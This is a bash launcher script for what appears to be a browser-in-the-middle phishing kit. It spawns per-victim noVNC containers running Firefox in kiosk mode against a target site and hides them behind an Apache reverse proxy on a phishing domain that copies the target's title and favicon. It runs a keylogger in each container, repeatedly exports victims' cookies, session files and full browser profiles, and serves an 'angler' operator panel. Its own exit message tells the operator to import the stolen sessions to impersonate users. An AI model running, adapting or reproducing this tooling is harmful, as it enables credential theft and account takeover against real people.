#!/bin/bash

# [ Cool banner ]
cat << EOF
                          __    __       __    
 .--.--.-----.-----.-----|  |--|__.-----|  |--.
 |  |  |  -__|__ --|  _  |     |  |__ --|     |
 |___  |_____|_____|   __|__|__|__|_____|__|__|
 |_____|           |__|                        

EOF

#
# [ Argument Parsing ]
#

helpFunction() {
    echo ""
    echo "Usage: $0 -u No. Users -d Domain -t Target"
    echo -e "\t -u Number of users - please note for every user a container is spawned so don't go crazy"
    echo -e "\t -d Domain which is used for phishing"
    echo -e "\t -t Target website which should be displayed for the user"
    echo -e "\t -e Export format"
    echo -e "\t -s true / false if ssl is required - if ssl is set pem and key file are needed"
    echo -e "\t -c Full path to the pem file of the ssl certificate"
    echo -e "\t -k Full path to the key file of the ssl certificate"
    echo -e "\t -a Adjust default user agent string"  
    echo -e "\t -z Compress profile to zip - will be ignored if parameter -e is set"
    echo -e "\t -r true / false to turn on the redirection to the target page"
    echo -e "\t -x true / false to turn on the remote debugging port in all browsers"
    echo -e "\t -l Preferred language codes for the browser (such as en,es,pt,pt-BR)"
    exit 1 # Exit script after printing help
}

while getopts "u:d:t:s:c:k:e:a:z:p:r:x:l:" opt
do
    case "$opt" in
        u ) User="$OPTARG" ;;
        d ) Domain="$OPTARG" ;;
        t ) Target="$OPTARG" ;;
        e ) OFormat="$OPTARG" ;;
        s ) SSL="$OPTARG" ;;
        c ) cert="$OPTARG" ;;
        k ) key="$OPTARG" ;;
        a ) useragent=$OPTARG ;;
        z ) rzip=$OPTARG ;;
        p ) param=$OPTARG ;;
        r ) Redirect=$OPTARG ;;
        x ) DebugPort=$OPTARG ;;
        l ) AcceptLang=$OPTARG ;;
        ? ) helpFunction ;; # Print helpFunction in case parameter is non-existent
    esac
done

#
# [ Globals ]
#

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'
PROFILE_COPY_INTERVAL=5

# Begin script in case all parameters are correct

# Loop for every user a docker container need to be started 
 
# Write of default config for apache

#
# [ Modules ]
#

declare -A builds=(
    ["vnc-docker"]="VNC-Dockerfile"
    ["mvnc-docker"]="MVNC-Dockerfile"
    ["rev-proxy"]="PROXY-Dockerfile"
)

build_docker_images() {
    for tag in "${!builds[@]}"; do
        dockerfile=${builds[$tag]}
        echo -e "${YELLOW}[~] Building image '${tag}' from '${dockerfile}'...${NC}"
        
        if sudo docker build -t "$tag" -f "./$dockerfile" ./; then
            echo -e "${GREEN}[+] Successfully built '${tag}' image.${NC}"
        else
            echo -e "${RED}[-] Failed to build '${tag}' from '${dockerfile}'.${NC}" >&2
            return 1
        fi
    done
}

clean_docker_images() {
    echo -e "${YELLOW}[~] Stopping and removing VNC and reverse proxy containers...${NC}"

    vnc_containers=$(sudo docker ps --filter=name="vnc-*" -q)
    proxy_containers=$(sudo docker ps --filter=name="rev-proxy" -q)

    if [[ -n "$vnc_containers" ]]; then
        if sudo docker rm -f $vnc_containers; then
            echo -e "${GREEN}[+] Removed vnc-* containers.${NC}"
        else
            echo -e "${RED}[-] Failed to remove vnc-* containers.${NC}" >&2
            return 1
        fi
    fi

    if [[ -n "$proxy_containers" ]]; then
        if sudo docker rm -f $proxy_containers; then
            echo -e "${GREEN}[-] Removed rev-proxy container(s).${NC}"
        else
            echo -e "${RED}[-] Failed to remove rev-proxy container(s).${NC}" >&2
            return 1
        fi
    fi

    while true; do
        read -p "$(echo -e "Do you want to perform a full cleanup? [y/n] ")" yn
        case $yn in
            [Yy]* )
                echo -e "${YELLOW}[~] Removing related Docker images...${NC}"
                images=("vnc-docker" "mvnc-docker" "rev-proxy") # TODO: Remove in favor of 'builds'
                for img in "${images[@]}"; do
                    img_ids=$(sudo docker images --filter=reference="$img" -q)
                    if [[ -n "$img_ids" ]]; then
                        if sudo docker rmi -f $img_ids; then
                            echo -e "${GREEN}[+] Removed image: $img${NC}"
                        else
                            echo -e "${RED}[-] Failed to remove image: $img${NC}" >&2
                            return 1
                        fi
                    fi
                done
                break;;
            [Nn]* )
                echo -e "${YELLOW}[~] Skipping image removal.${NC}"
                break;;
            * )
                echo -e "${RED}[-] Please answer y or n.${NC}";;
        esac
    done
}

copy_profile() {
    # User ID
    local x=$1
    shift

    # URLs
    local urls=("$@")

    pushd ./output &> /dev/null
    sudo docker exec vnc-user$x sh -c "find -name recovery.jsonlz4 -exec cp {} /home/headless/ \;"
    sudo docker exec vnc-user$x sh -c "find -name cookies.sqlite -exec cp {} /home/headless/ \;"
    sudo docker exec vnc-user$x test -e /home/headless/Keylog.txt && sudo docker cp vnc-user$x:/home/headless/Keylog.txt ./user$x-keylog.txt
    sudo docker exec "mvnc-user$((x + 1 ))" sh -c "find -name recovery.jsonlz4 -exec cp {} /home/headless/ \;"
    sudo docker exec "mvnc-user$((x + 1 ))" sh -c "find -name cookies.sqlite -exec cp {} /home/headless/ \;"
    sudo docker exec "mvnc-user$((x + 1 ))" test -e /home/headless/Keylog.txt && sudo docker cp "mvnc-user$((x + 1 ))":/home/headless/Keylog.txt ./muser$x-keylog.txt
    sleep 2
    sudo docker cp vnc-user$x:/home/headless/recovery.jsonlz4 ./user$x-recovery.jsonlz4
    sudo docker cp vnc-user$x:/home/headless/cookies.sqlite ./user$x-cookies.sqlite
    sudo docker exec vnc-user$x sh -c "rm -f /home/headless/recovery.jsonlz4"
    sudo docker exec vnc-user$x sh -c "rm -f /home/headless/cookies.sqlite"

    sudo docker cp "mvnc-user$((x + 1 ))":/home/headless/recovery.jsonlz4 ./muser$x-recovery.jsonlz4
    sudo docker cp "mvnc-user$((x + 1 ))":/home/headless/cookies.sqlite ./muser$x-cookies.sqlite
    sudo docker exec "mvnc-user$((x + 1 ))" sh -c "rm -f /home/headless/recovery.jsonlz4"
    sudo docker exec "mvnc-user$((x + 1 ))" sh -c "rm -f /home/headless/cookies.sqlite"
    sleep 2
    if [ -n "$OFormat" ]; then
        FormatArg=simple
    else
        FormatArg=default

        sudo docker exec vnc-user$x sh -c 'cp -rf .mozilla/firefox/$(find -name recovery.jsonlz4 | cut -d "/" -f 4)/ ffprofile'
        sudo docker cp vnc-user$x:/home/headless/ffprofile ./phis$x-ffprofile
        sudo docker exec vnc-user$x sh -c "rm -rf /home/headless/ffprofile"
        sudo chown -R 1000 ./phis$x-ffprofile

        sudo docker exec "mvnc-user$((x + 1 ))" sh -c 'cp -rf .mozilla/firefox/$(find -name recovery.jsonlz4 | cut -d "/" -f 4)/ ffprofile'
        sudo docker cp "mvnc-user$((x + 1 ))":/home/headless/ffprofile ./mphis$x-ffprofile
        sudo docker exec "mvnc-user$((x + 1 ))" sh -c "rm -rf /home/headless/ffprofile"
        sudo chown -R 1000 ./mphis$x-ffprofile

        if [ "$rzip" = "true" ]; then
            zip -r phis$x-ffprofile.zip phis$x-ffprofile/ &> /dev/null
            rm -r phis$x-ffprofile/

            zip -r mphis$x-ffprofile.zip mphis$x-ffprofile/ &> /dev/null
            rm -r mphis$x-ffprofile/
        fi
    fi

    popd &> /dev/null

    python3 ./scripts/session-collector.py ./user$x-recovery.jsonlz4 $FormatArg
    python3 ./scripts/cookies-collector.py ./user$x-cookies.sqlite $FormatArg
    python3 ./scripts/session-collector.py ./muser$x-recovery.jsonlz4 $FormatArg
    python3 ./scripts/cookies-collector.py ./muser$x-cookies.sqlite $FormatArg

    pushd ./output &> /dev/null

    rm -f user$x-recovery.jsonlz4 \
          user$x-cookies.sqlite user$x-cookies.sqlite* \
          muser$x-recovery.jsonlz4 muser$x-cookies.sqlite muser$x-cookies.sqlite*

    popd &> /dev/null

    python3 ./scripts/status.py $x "${urls[$(($x - 1))]}"
}

#
# [ Main logic ]
#

case "$1" in 

"install")
    build_docker_images
    ;;
"cleanup")
    clean_docker_images
    ;;
*)
    
    # Print helpFunction in case parameters are empty
    if [ -z "$User" ] || [ -z "$Domain" ] || [ -z "$Target" ]; then
        echo "Some or all of the parameters are empty";
        helpFunction
    fi
    
    if [ -z "$rzip" ]; then
        rzip=true
    fi

    if [ -n "$SSL" ]; then
        if [ -z "$cert" ] || [ -z "$key" ]; then
            echo "Some or all of the parameters are empty";
            helpFunction
        elif [ ! -f "$cert" ] || [ ! -f "$key" ]; then 
            echo "Certificate and / or Key file could not be found."
            exit 1
        fi
    fi

    START=1
    END=$((User * 2))
    
    temptitle=$(curl $Target -sL -A 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36' | grep -oP '(?<=title).*(?<=title>)' | grep -oP '(?=>).*(?=<)') 
    pagetitle="${temptitle:1}"
    
    # Fetch the favicon for the target page
    curl https://www.google.com/s2/favicons?domain=$Target -sL --output novnc.ico
    icopath="./novnc.ico"
    
    echo -e "${YELLOW}[~] Generating configuration file${NC}" 
    echo 'NameVirtualHost *
             Header unset ETag
             Header set Cache-Control "max-age=0, no-cache, no-store, must-revalidate"
             Header set Pragma "no-cache"
             Header set Expires "Wed, 12 Jan 1980 05:00:00 GMT"
         ' > ./proxy/000-default.conf
    
    if [ -n "$SSL" ]
    then
        echo "<VirtualHost *:443>" >> ./proxy/000-default.conf
        echo "
        SSLEngine on
          SSLProxyEngine on
           SSLCertificateFile /etc/ssl/certs/server.pem
           SSLCertificateKeyFile /etc/ssl/private/server.key
        " >> ./proxy/000-default.conf
        echo '
        RewriteEngine On
            RewriteMap redirects txt:/tmp/redirects.txt
        RewriteCond ${redirects:%{REQUEST_URI}} ^(.+)$
        RewriteRule ^(.*)$ ${redirects:$1} [R,L]
            
            <Location /status.php>
            Deny from all
        </Location>
        ' >> ./proxy/000-default.conf
    else
        echo "<VirtualHost *:80>" >> ./proxy/000-default.conf
        echo '
        RewriteEngine On
            RewriteMap redirects txt:/tmp/redirects.txt
        RewriteCond ${redirects:%{REQUEST_URI}} ^(.+)$
        RewriteRule ^(.*)$ ${redirects:$1} [R,L]
        
        <Location /status.php>
            Deny from all
        </Location>

        ' >> ./proxy/000-default.conf
    fi
     
    echo -e "${GREEN}[+] Configuration file generated${NC}" 
    
    htmlpath="./output/status.php"
    if [ -e $htmlpath ]; then
        rm -rf $htmlpath
    fi
    
    cat templates/status.header.php > ./output/status.php

    # Start with a basic template for user preferences, then
    # fill them with needed values for each case
    # and upload to each container
    cat templates/user.header.js > vnc/muser.js;
    cat templates/user.header.js > vnc/user.js;
    echo "" >> vnc/muser.js;
    echo "" >> vnc/user.js;
    if [ -n $AcceptLang ]; then
        echo 'user_pref("intl.accept_languages", "'$AcceptLang'");' >> ./vnc/muser.js
        echo 'user_pref("intl.accept_languages", "'$AcceptLang'");' >> ./vnc/user.js
    fi

    if [ -n "$useragent" ]; then
        # Custom UA, mobile (don't override)
        echo 'user_pref("general.useragent.override","Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/114.1 Mobile/15E148 Safari/605.1.15");' >> ./vnc/muser.js

        # Custom UA, desktop (override)
        echo 'user_pref("general.useragent.override","'$useragent'");' >> ./vnc/user.js
    else
        # No custom UA, mobile
        echo 'user_pref("general.useragent.override","Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/114.1 Mobile/15E148 Safari/605.1.15");' >> ./vnc/muser.js
        echo 'user_pref("layout.css.devPixelsPerPx", "0.9");' >> ./vnc/muser.js

        # No custom UA, desktop
        echo 'user_pref("general.useragent.override","Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:138.0) Gecko/20100101 Firefox/138.0");' >> ./vnc/user.js
    fi

    mobile=false

    declare -a urls=()

    echo -e "${YELLOW}[-] Starting containers${NC}"  
    for (( c=$START; c<=$END; c++ )); do
        if [ "$mobile" = "true" ]; then
            VNC_IMG=mvnc-docker;
            VNC_CONT=mvnc-user$c;
        else
            VNC_IMG=vnc-docker;
            VNC_CONT=vnc-user$c;
        fi

        echo -e "${BLUE}———— ${VNC_CONT} (from image ${VNC_IMG}) [$c/$END] ————${NC}";

        PW=$(openssl rand -hex 14)
        AdminPW=$(tr -dc 'A-Za-z0-9!' < /dev/urandom | head -c 32)
        Token=$(cat /proc/sys/kernel/random/uuid)

        # Start up the corresponding VNC container
        # and then firefox a single time (just to set up the profile?)
        if [ "$DebugPort" = "true" ]; then
            DEBUGPORT_HOST=9$(printf "%03d" $c)
            echo -e "${GREEN}[+] RemoteDebuggingPort: $DEBUGPORT_HOST${NC}"
            sudo docker run -dit -p $DEBUGPORT_HOST:9223 --name $VNC_CONT -e VNC_PW=$PW -e NOVNC_HEARTBEAT=30 $VNC_IMG  &> /dev/null 
            sudo docker exec -dit $VNC_CONT sh -c 'socat TCP-LISTEN:9223,fork TCP:127.0.0.1:9222'
        else
            sudo docker run -dit --name $VNC_CONT -e VNC_PW=$PW -e NOVNC_HEARTBEAT=30 $VNC_IMG  &> /dev/null 
        fi
        sleep 3
        sudo docker exec $VNC_CONT sh -c "firefox &" &> /dev/null
        sleep 1
        sudo docker exec $VNC_CONT sh -c "pidof firefox | xargs kill &" &> /dev/null
        sleep 2

        if [ "$mobile" = "true" ]; then
            sudo docker cp ./vnc/muser.js $VNC_CONT:/home/headless/user.js
        else
            sudo docker cp ./vnc/user.js $VNC_CONT:/home/headless/user.js
        fi

        #sleep 1;

        sudo docker exec $VNC_CONT sh -c "find -name cookies.sqlite -exec dirname {} \; | xargs -I {} cp -f -r /home/headless/user.js {}"


        sleep 1
        
        if [ -n "$pagetitle" ]; then
            sudo docker exec --user root $VNC_CONT sh -c "sed -i 's/Connecting.../$pagetitle/' /usr/libexec/noVNCdim/conn.html"
            sudo docker exec --user root $VNC_CONT sh -c "sed -i 's/Connecting.../$pagetitle/' /usr/libexec/noVNCdim/app/ui.js"
            if [ "$mobile" = "true" ]; then
                sudo docker exec --user root $VNC_CONT sh -c "sed -i 's/min-width: 8em;/\/\*min-width: 8em;\*\//' /usr/libexec/noVNCdim/app/styles/input.css"
            fi
        fi
        
        if [ -e $icopath ]; then
            sudo docker cp ./novnc.ico $VNC_CONT:/usr/libexec/noVNCdim/app/images/icons/novnc.ico
        fi

        # Replace TARGET_URL placeholder with actual target inside vnc/ui.js
        if [ -n "$Redirect" ]
        then
            RedirectTarget=$Target
            if [ "$mobile" = "true" ]
            then
                sudo docker exec --user root mvnc-user$c sh -c "sed -i 's/TARGET_URL/${Target//\//\\/}/g' /usr/libexec/noVNCdim/app/ui.js"
            else
                sudo docker exec --user root vnc-user$c sh -c "sed -i 's/TARGET_URL/${Target//\//\\/}/g' /usr/libexec/noVNCdim/app/ui.js"
            fi
        else
            RedirectTarget="/"
            if [ -n "$SSL" ]
            then
                if [ "$mobile" = "true" ]
                then
                    sudo docker exec --user root mvnc-user$c sh -c "sed -i 's/TARGET_URL/https:\/\/$Domain/g' /usr/libexec/noVNCdim/app/ui.js"
                else
                    sudo docker exec --user root vnc-user$c sh -c "sed -i 's/TARGET_URL/https:\/\/$Domain/g' /usr/libexec/noVNCdim/app/ui.js"
                fi
            else
                if [ "$mobile" = "true" ]
                then
                    sudo docker exec --user root mvnc-user$c sh -c "sed -i 's/TARGET_URL/http:\/\/$Domain/g' /usr/libexec/noVNCdim/app/ui.js"
                else
                    sudo docker exec --user root vnc-user$c sh -c "sed -i 's/TARGET_URL/http:\/\/$Domain/g' /usr/libexec/noVNCdim/app/ui.js"
                fi
            fi
        fi
        
        # Important sleep!
        sleep 6;

        # Keylogger
        echo -e "${YELLOW}[~] Starting keylogger...${NC}"
        sudo docker exec -dit $VNC_CONT sh -c "python3 /home/headless/logger.py" 
        echo -e "${GREEN}[+] Keylogger started${NC}"
        
        if [ "$DebugPort" = "true" ]; then
            FIREFOX_SPAWN_CMD="xrandr --output VNC-0 & env DISPLAY=:1 firefox $Target --remote-debugging-port=9222 --kiosk &"
        else
            FIREFOX_SPAWN_CMD="xrandr --output VNC-0 & env DISPLAY=:1 firefox $Target --kiosk &"
        fi

        if [ "$mobile" = "true" ]; then
            sudo docker exec $VNC_CONT sh -c "nohup unclutter -idle 0 > /dev/null 2>&1 &"
        else
            sudo docker exec $VNC_CONT sh -c "xfconf-query --channel xsettings --property /Gtk/CursorThemeName --set WinCursor &" 
        fi     

        echo -e "${YELLOW}[~] Starting browser...${NC}"
        sudo docker exec $VNC_CONT sh -c "$FIREFOX_SPAWN_CMD" &> /dev/null    
        echo -e "${GREEN}[+] Browser started${NC}"

        CIP=$(sudo docker container inspect $VNC_CONT | grep -m 1 -oP '"IPAddress":\s*"\K[^"]+')
                
        if [ "$mobile" = "true" ]; then
            filename="miframe$((c - 1)).html"
        else
            filename="iframe$c.html"
        fi
        
        if [ -n "$SSL" ]
        then
        echo "
        <!DOCTYPE html>
        <html lang='en'>
        <head>
            <meta charset='UTF-8'>
            <meta name='viewport' content='width=device-width, initial-scale=1.0'>
            <link rel='icon' href='https://$Domain/favicon.ico' type='image/x-icon'>
            
            <title>$pagetitle</title>
            
            <style>
            body, html {
                height: 100%;
                margin: 0;
                overflow: hidden;
            }
            iframe {
                width: 100%;
                height: 100%;
                border: none;
            }
            </style>
            <script>
            function resizeIframe() {
                var iframe = document.getElementById('myIframe');
                iframe.style.height = window.innerHeight + 'px';
                iframe.style.width = window.innerWidth + 'px';
            }

            window.onload = function () {
                resizeIframe(); // Resize on initial load
                window.addEventListener('resize', resizeIframe); // Resize on window resize
            };
            </script>
        </head>
        <body>
            <iframe id='myIframe' src='https://$Domain/$PW/conn.html?path=/$PW/websockify&password=$PW&autoconnect=true&resize=remote' frameborder='0'></iframe>
        </body>
        </html>
        " > ./proxy/$filename
        else
        echo "
        <!DOCTYPE html>
        <html lang='en'>
        <head>
            <meta charset='UTF-8'>
            <meta name='viewport' content='width=device-width, initial-scale=1.0'>
            <link rel='icon' href='http://$Domain/favicon.ico' type='image/x-icon'>
            <title>$pagetitle</title>
            <style>
            body, html {
                height: 100%;
                margin: 0;
                overflow: hidden;
            }
            iframe {
                width: 100%;
                height: 100%;
                border: none;
            }
            </style>
            <script>
            function resizeIframe() {
                var iframe = document.getElementById('myIframe');
                iframe.style.height = window.innerHeight + 'px';
                iframe.style.width = window.innerWidth + 'px';
            }

            window.onload = function () {
                resizeIframe(); // Resize on initial load
                window.addEventListener('resize', resizeIframe); // Resize on window resize
            };
            </script>
        </head>
        <body>
            <iframe id='myIframe' src='http://$Domain/$PW/conn.html?path=/$PW/websockify&password=$PW&autoconnect=true&resize=remote' frameborder='0'></iframe>
        </body>
        </html>
        " > ./proxy/$filename
        fi
        
        if [ "$mobile" = "false" ]
        then
        echo "
            RewriteCond %{REQUEST_URI} /v$c
            RewriteCond %{HTTP_USER_AGENT} \"iPhone|Android|iPad\"
            RewriteRule ^/(.*) /miframe$c.html [P,L]
            
            RewriteCond %{REQUEST_URI} /v$c
            RewriteCond %{HTTP_USER_AGENT} !(iPhone|Android|iPad)
            RewriteRule ^/(.*) /iframe$c.html [P]
        " >> ./proxy/000-default.conf
        fi
        
        echo "
            
        <Location /$PW>
        ProxyPass http://$CIP:6901
        ProxyPassReverse http://$CIP:6901
        </Location>
        <Location /$PW/websockify>
        ProxyPass ws://$CIP:6901/websockify keepalive=On
        ProxyPassReverse ws://$CIP:6901/websockify
        </Location>
        ProxyTimeout 600
        Timeout 600
    " >> ./proxy/000-default.conf
        
        if [ -n "$SSL" ]
        then
        echo "
            <div class='iframe-wrapper'>
              <iframe class='custom-iframe' src='https://$Domain/$PW/conn.html?path=/$PW/websockify&password=$PW&autoconnect=true&resize=remote&view_only=true' sandbox='allow-same-origin allow-scripts'></iframe>
              <!-- Form for file creation -->
              <form method='post'>
            <!-- Buttons inside the wrapper -->
            <div class='iframe-buttons'>
              <a class='iframe-button' href='https://$Domain/$PW/conn.html?path=/$PW/websockify&password=$PW&autoconnect=true&resize=remote&view_only=true' target='_blank' > View </a>
              <input type='hidden' name='file_content' value='/$PW/websockify $RedirectTarget'>
              <input type='hidden' name='file_content2' value='/$PW/conn.html $RedirectTarget'>
              <input type='hidden' name='ip_value' value='$CIP'>
              <button type='submit' name='create_file' class='iframe-button'>Disconnect</button>
              <a class='iframe-button' href='https://$Domain:65534/angler/$PW/conn.html?path=/angler/$PW/websockify&password=$PW&autoconnect=true&resize=remote' target='_blank'>Connect</a>
            </div>
              </form>
            </div>            
        " >> ./output/status.php
        if [ "$mobile" = "false" ]
        then
            if [ -n "$param" ]
            then
            urls+=("http://$Domain/v$c/$param")
            else
            urls+=("http://$Domain/v$c/oauth2/authorize?access-token=$Token")
            fi
        fi
        else
        echo "
            <div class='iframe-wrapper'>
              <iframe class='custom-iframe' src='http://$Domain/$PW/conn.html?path=/$PW/websockify&password=$PW&autoconnect=true&resize=remote&view_only=true' sandbox='allow-same-origin allow-scripts'></iframe>
              <!-- Form for file creation -->
              <form method='post'>
            <!-- Buttons inside the wrapper -->
            <div class='iframe-buttons'>
              <a class='iframe-button' href='http://$Domain/$PW/conn.html?path=/$PW/websockify&password=$PW&autoconnect=true&resize=remote&view_only=true' target='_blank' > View </a>
              <input type='hidden' name='file_content' value='/$PW/websockify $RedirectTarget'>
              <input type='hidden' name='file_content2' value='/$PW/conn.html $RedirectTarget'>
              <input type='hidden' name='ip_value' value='$CIP'>
              <button type='submit' name='create_file' class='iframe-button'>Disconnect</button>
              <a class='iframe-button' href='http://$Domain:65534/angler/$PW/conn.html?path=/angler/$PW/websockify&password=$PW&autoconnect=true&resize=remote' target='_blank'>Connect</a>
            </div>
              </form>
            </div>
        " >> ./output/status.php
        if [ "$mobile" = "false" ]
        then
            if [ -n "$param" ]
            then
            urls+=("http://$Domain/v$c/$param")
            else
            urls+=("http://$Domain/v$c/oauth2/authorize?access-token=$Token")
            fi
        fi
        fi
    
    if [ "$mobile" = "true" ]
    then
        mobile=false
    else
        mobile=true
    fi 
    
    done
    echo "
        </div>
    </body>
    </html>
        " >> ./output/status.php
    echo "</VirtualHost>" >> ./proxy/000-default.conf

        
    if [ -n "$SSL" ]; then
        apachefile="./proxy/000-default.conf"
        awk '/<VirtualHost/,/<\/VirtualHost/ {gsub(":443", ":65534");gsub("Location /","Location /angler/");print; if (/<\/VirtualHost/) print ""}' "$apachefile" > temp.txt
        awk '/<VirtualHost/,/<\/VirtualHost/ {gsub("Location /angler/status.php","Location /");gsub("Deny from all","AuthType Basic \n                    AuthName \"Restricted Area\" \n                    AuthUserFile /etc/apache2/.htpasswd \n                    Require valid-user");print; if (/<\/VirtualHost/) print ""}' "temp.txt" > temp2.txt
    else
        apachefile="./proxy/000-default.conf"
        awk '/<VirtualHost/,/<\/VirtualHost/ {gsub(":80", ":65534");gsub("Location /","Location /angler/");print; if (/<\/VirtualHost/) print ""}' "$apachefile" > temp.txt
        awk '/<VirtualHost/,/<\/VirtualHost/ {gsub("Location /angler/status.php","Location /");gsub("Deny from all","AuthType Basic \n                    AuthName \"Restricted Area\" \n                    AuthUserFile /etc/apache2/.htpasswd \n                    Require valid-user");print; if (/<\/VirtualHost/) print ""}' "temp.txt" > temp2.txt
    fi
   
    cat temp2.txt >> ./proxy/000-default.conf
    
    rm -f ./temp.txt ./temp2.txt

    echo -e "${BLUE}————————————————————————————————————————————————${NC}"
    echo -e "${GREEN}[+] All VNC containers started${NC}"
    echo -e "${YELLOW}[~] Starting reverse proxy${NC}"  

    # Start of rev proxy
    if [ -n "$SSL" ]; then
        sudo docker run -dit -p443:443 -p65534:65534 --name rev-proxy rev-proxy /bin/bash &> /dev/null
    else
        sudo docker run -dit -p80:80 -p65534:65534 --name rev-proxy rev-proxy /bin/bash &> /dev/null
    fi
    
    sleep 5

    if [ -n "$SSL" ]; then
        sudo docker cp $cert rev-proxy:/etc/ssl/certs/server.pem
        sudo docker cp $key rev-proxy:/etc/ssl/private/server.key
    fi
    
    sudo docker exec rev-proxy /bin/bash -c 'echo "Listen 65534" >> /etc/apache2/ports.conf' 
    sudo docker exec -it rev-proxy /bin/bash -c "htpasswd -cb /etc/apache2/.htpasswd angler $AdminPW"
    sudo docker cp ./proxy/000-default.conf rev-proxy:/etc/apache2/sites-enabled/   &> /dev/null
    sudo docker cp ./novnc.ico rev-proxy:/var/www/html/favicon.ico
    END=$((END / 2))
    for (( d=$START; d<=$END; d++ )); do
        sudo docker cp ./proxy/iframe$d.html rev-proxy:/var/www/html/
        sudo docker cp ./proxy/miframe$d.html rev-proxy:/var/www/html/
    done
    sudo docker exec rev-proxy sed -i 's/MaxKeepAliveRequests 100/MaxKeepAliveRequests 0/' '/etc/apache2/apache2.conf'
    
    sudo docker exec rev-proxy /bin/bash service apache2 restart &> /dev/null
    sudo docker exec rev-proxy /bin/bash -c "cron"
    sleep 3
    sudo docker exec rev-proxy /bin/bash -c "crontab"
    sudo docker cp ./output/status.php rev-proxy:/var/www/html/

    rm -f ./novnc.ico

    echo -e "${GREEN}[+] Reverse proxy started${NC}"

    echo -n "[+] Admin interface available under: "
    if [ -n "$SSL" ]; then
        echo -e "https://$Domain:65534/status.php"
    else
        echo -e "http://$Domain:65534/status.php"
    fi
        
    echo -e "    +----------------------------------------------+"
    echo -e "    | Username | ${BLUE}angler${NC}                           |"
    echo -e "    | Password | ${BLUE}$AdminPW${NC} |"
    echo -e "    +----------------------------------------------+"
    echo -e "${GREEN}[+] Setup completed${NC}"
    echo -e "[+] Use the following URLs:"
    for value in "${urls[@]}"; do
        echo -e "    $value"
    done
    
    dbpath="./output/phis.db"
    if [ -e $dbpath ]; then
        rm -f $dbpath
    fi
    
    echo -e "[~] Starting Loop to collect sessions and cookies from containers${NC}" 
    echo -e "    You can check and view the open session by use of the status.php in the output directory${NC}" 

    # Start a loop which copies the cookies from the containers
    echo -e "    Every $PROFILE_COPY_INTERVAL Seconds Cookies and Sessions are exported - Press [CTRL+C] to stop.."

    trap 'echo -e "\n[~] Import stealed session and cookie JSON or the firefox profile to impersonate user"; echo -e "[~] VNC and Rev-Proxy container will be removed" ; sleep 2 ; sudo docker rm -f $(sudo docker ps --filter=name="vnc-*" -q) &> /dev/null && sudo docker rm -f $(sudo docker ps --filter=name="rev-proxy" -q) &> /dev/null & printf "[+] Done!"; sleep 2' SIGTERM EXIT

    sleep $PROFILE_COPY_INTERVAL

    > logs/copy_profile.log
    while :; do
        for (( c=$START; c<=$END; c++ )); do
            copy_profile $c $urls >> logs/copy_profile.log 2>&1
        done

        sleep $PROFILE_COPY_INTERVAL
        echo -e "\033[$((($c * 3) - 2))A"
    done

    ;;
esac
